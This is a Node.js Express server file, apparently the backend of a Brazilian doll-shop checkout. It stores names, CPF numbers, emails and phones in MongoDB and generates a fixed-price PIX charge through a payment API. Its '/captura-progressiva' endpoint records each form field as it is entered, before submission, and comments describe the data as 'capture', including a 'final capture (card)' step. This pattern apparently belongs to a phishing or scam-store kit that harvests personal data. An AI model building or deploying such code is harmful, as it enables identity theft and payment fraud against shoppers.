const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const mongoose = require("mongoose");
const dotenv = require("dotenv");
const axios = require("axios");
const path = require("path");

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public"));

// ✅ Conexão com MongoDB
mongoose
  .connect(process.env.MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("✅ MongoDB conectado com sucesso"))
  .catch((err) => console.log("❌ Erro ao conectar MongoDB:", err));

// ✅ Modelos MongoDB
const DadosFinais = mongoose.model("DadosFinais", new mongoose.Schema({
  nome: String,
  cpf: String,
  email: String,
  telefone: String,
  boneca: String,
  cabelo: String,
  olhos: String,
  formaPagamento: String,
  dataEnvio: { type: Date, default: Date.now },
}));

const CapturaProgressiva = mongoose.model("CapturaProgressiva", new mongoose.Schema({
  campo: String,
  valor: String,
  dataEnvio: { type: Date, default: Date.now },
}));

// ✅ Captura progressiva
app.post("/captura-progressiva", async (req, res) => {
  try {
    const { campo, valor } = req.body;
    await CapturaProgressiva.create({ campo, valor });
    res.status(200).send("Captura salva");
  } catch (err) {
    res.status(500).send("Erro ao salvar captura");
  }
});

// ✅ Captura final (cartão)
app.post("/submit-form", async (req, res) => {
  try {
    const { nome, cpf, email, telefone, boneca, cabelo, olhos, formaPagamento } = req.body;
    await DadosFinais.create({ nome, cpf, email, telefone, boneca, cabelo, olhos, formaPagamento });
    res.status(200).json({ success: true });
  } catch (err) {
    console.error("❌ Erro ao processar envio:", err);
    res.status(500).json({ success: false, message: "Erro ao processar. Tente novamente." });
  }
});

// ✅ Geração do QR Code PIX
app.post("/gerar-pix", async (req, res) => {
  const { nome, cpf, email, telefone } = req.body;

  try {
    const response = await axios.post(
      "https://api.risepay.com.br/api/External/Transactions",
      {
        amount: 249.95,
        payment: {
          method: "pix",
          expiresAt: 48
        },
        customer: {
          name: nome,
          cpf,
          email,
          phone: telefone
        }
      },
      {
        headers: {
          Authorization: process.env.RISEPAY_PRIVATE_TOKEN,
          "Content-Type": "application/json"
        }
      }
    );

    res.status(200).json({ success: true, data: response.data });
  } catch (err) {
    console.error("❌ Erro ao gerar Pix:", err.response?.data || err.message);
    res.status(500).json({ success: false, message: "Erro ao gerar Pix." });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
});
